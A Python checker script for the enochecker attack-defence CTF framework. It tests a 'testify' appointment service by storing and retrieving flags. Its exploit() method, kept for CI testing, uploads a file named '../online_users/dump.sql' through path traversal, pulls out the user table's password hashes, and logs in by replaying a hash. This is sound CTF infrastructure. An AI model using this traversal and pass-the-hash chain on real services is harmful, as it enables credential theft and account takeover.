#!/usr/bin/env python3
import base64
import re

from enochecker import BaseChecker, BrokenServiceException, EnoException, run
from enochecker.utils import SimpleSocket, assert_equals, assert_in
import random
import string
from faker import Faker


def get_profile():
    fake = Faker()
    profile = fake.simple_profile()
    return {
        'username': profile['username'],
        'password': get_random_string(),
        'prename': profile['name'].split()[0],
        'lastname': profile['name'].split()[-1],
        'date': profile['birthdate'].strftime('%Y-%m-%d'),
        'time': fake.time(pattern='%H:%M'),
        'file': fake.text(),
        'filename': fake.file_name(category="image")
    }


def get_random_string():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))


def tuple_string_to_list(test_str):
    res = []
    temp = []
    for token in test_str.split(","):
        num = str(token.replace("(", "").replace(")", ""))
        temp.append(num)
        if ")" in token:
            res.append(tuple(temp))
            temp = []
    return res


class testifyChecker(BaseChecker):
    ##### EDIT YOUR CHECKER PARAMETERS
    flag_variants = 1
    noise_variants = 1
    havoc_variants = 3
    service_name = "testify"
    port = 6597  # The port will automatically be picked up as default by self.connect and self.http.

    ##### END CHECKER PARAMETERS

    def register(self, username, password):
        obj = {
            'username': username,
            'password': base64.b64encode(bytes(password, 'utf-8')).decode('ascii'),
            'email': username + '@' + username + '.de',
            'login': 'signup'
        }
        kwargs = {
            'data': obj,
            'allow_redirects': True
        }
        self.debug(
            f"Sending command to register user: {username} with password: {password}"
        )
        res = self.http_post('/login', **kwargs)
        if res.status_code != 200:
            raise BrokenServiceException("could not register user at service")

    def login(self, username, password):
        obj = {
            'username': username,
            'password': base64.b64encode(bytes(password, 'utf-8')).decode('ascii'),
            'login': 'signin'
        }
        kwargs = {
            'data': obj,
            'allow_redirects': True
        }
        self.debug(
            f"Sending command to login user: {username} with password: {password}"
        )
        res = self.http_post('/login', **kwargs)
        if res.status_code != 200:
            raise BrokenServiceException("could not login user at service")

    def make_appointment(self, prename, lastname, filename, date, time, file):
        """
        makes appointment using flag as prename, filename
        returns appointment id
        """
        data = {
            'prename': prename,
            'lastname': lastname,
            'date': date,
            'time': time
        }
        files = {'id_image': (filename, file, 'application/octet-stream')}

        kwargs = {
            'data': data,
            'files': files,
            'allow_redirects': True
        }
        res = self.http_post('/make_appointment', **kwargs)
        if res.status_code != 200 or res.text.find('Could not make appointment') > 0:
            raise BrokenServiceException("could not make appointment")

        result = re.search('Successfully made appointment &lt;(.*)&gt', res.text)
        if result:
            return result.group(1)
        else:
            raise BrokenServiceException('could not get appointment id')

    def get_appointment(self, session_id, username='testuser'):
        kwargs = {
            'allow_redirects': True
        }
        resp = self.http_get('/appointments', **kwargs)
        return resp

    def putflag(self):  # type: () -> None
        if self.variant_id == 0:
            profile = get_profile()
            self.register(profile['username'], profile['password'])
            appointment_id = self.make_appointment(self.flag, profile['lastname'], profile['filename'], profile['date'],
                                                   profile['time'], profile['file'])

            # store in db
            self.chain_db = {
                "profile": profile,
                "app_id": appointment_id
            }
            self.debug('successfully made appointment %s' % appointment_id)

        else:
            raise EnoException("Wrong variant_id provided")

    def getflag(self):  # type: () -> None
        if self.variant_id == 0:
            # First we check if the previous putflag succeeded!
            try:
                profile = self.chain_db["profile"]
                app_id: str = self.chain_db["app_id"]
            except IndexError as ex:
                self.debug(f"error getting notes from db: {ex}")
                raise BrokenServiceException("Previous putflag failed.")

            # Let's login to the service
            session_id = self.login(profile['username'], profile['password'])
            resp = self.get_appointment(session_id)

            assert_in(self.flag, resp.text, "Resulting flag was found to be incorrect")
        else:
            raise EnoException("Wrong variant_id provided")

    def putnoise(self):  # type: () -> None
        if self.variant_id == 0:
            profile = get_profile()
            username = profile['username']
            password = profile['password']
            self.register(username, password)
            app_id = self.make_appointment(profile['prename'], profile['lastname'], profile['filename'],
                                           profile['date'], profile['time'], profile['file'])

            self.chain_db = {
                'profile': profile,
                'app_id': app_id
            }
        else:
            raise EnoException("Wrong variant_id provided")

    def getnoise(self):  # type: () -> None
        if self.variant_id == 0:
            try:
                profile = self.chain_db["profile"]
                app_id: int = self.chain_db["app_id"]
            except Exception as ex:
                self.debug("Failed to read db {ex}")
                raise BrokenServiceException("Previous putnoise failed.")
            session_id = self.login(profile['username'], profile['password'])
            resp = self.get_appointment(session_id)

            assert_in(profile['prename'], resp.text, "Resulting prename was found to be incorrect")
            assert_in(profile['lastname'], resp.text, "Resulting lastname was found to be incorrect")
            assert_in(profile['date'], resp.text, "Resulting date was found to be incorrect")
            assert_in(profile['time'], resp.text, "Resulting time found to be incorrect")
            resp = self.http_get('/get_id' + str(app_id))
            assert_in(profile['file'], resp.content.decode('utf-8'), "Resulting file found to be incorrect")
        else:
            raise EnoException("Wrong variant_id provided")

    def havoc(self):  # type: () -> None
        if self.variant_id == 0:
            # test create user
            profile = get_profile()
            username = profile['username']
            password = profile['password']
            self.register(username, password)
        elif self.variant_id == 1:
            pass
        elif self.variant_id == 2:
            pass
        else:
            raise EnoException("Wrong variant_id provided")


    def exploit(self):
        """
        This method was added for CI purposes for exploits to be tested.
        Will (hopefully) not be called during actual CTF.
        :raises EnoException on Error
        :return This function can return a result if it wants
                If nothing is returned, the service status is considered okay.
                The preferred way to report Errors in the service is by raising an appropriate EnoException
        """
        filename = '../online_users/dump.sql'
        profile = get_profile()
        username = profile['username']
        password = get_random_string()

        self.register(profile['username'], password)

        app_id = self.make_appointment(self.flag, profile['lastname'], filename, profile['date'], profile['time'],
                                       profile['file'])
        route = '/get_id' + str(app_id)

        kwargs = {
            'allow_redirects': True
        }

        res = self.http_get(route, **kwargs)
        sql_string = res.content[27:-2].decode('ascii')
        user_list = tuple_string_to_list(sql_string)
        tested = False
        for i in user_list:
            user = (i[1])[1:-1]
            hash = (i[2])[2:]
            if user == username:
                kwargs2 = {
                    'data': {
                        'username': user,
                        'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                        'login': 'signin'
                    }
                }

                res2 = self.http_post('/login', **kwargs2)
                assert_in(self.flag, res2.text, "Resulting flag was found to be incorrect")
                tested = True
        if not tested:
            raise BrokenServiceException("flag not found")


app = testifyChecker.service  # This can be used for uswgi.
if __name__ == "__main__":
    run(testifyChecker)
